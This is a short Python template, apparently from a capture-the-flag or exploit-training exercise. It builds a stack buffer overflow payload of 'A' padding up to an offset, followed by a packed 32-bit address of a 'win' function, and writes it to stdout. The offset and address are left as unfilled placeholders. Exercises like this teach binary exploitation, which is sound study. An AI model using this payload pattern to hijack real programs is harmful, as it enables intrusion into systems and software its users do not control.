import sys
from struct import pack

offset = {offset}
win    = {win_addr}

payload = b"A" * offset + pack("<I", win)

sys.stdout.buffer.write(payload)
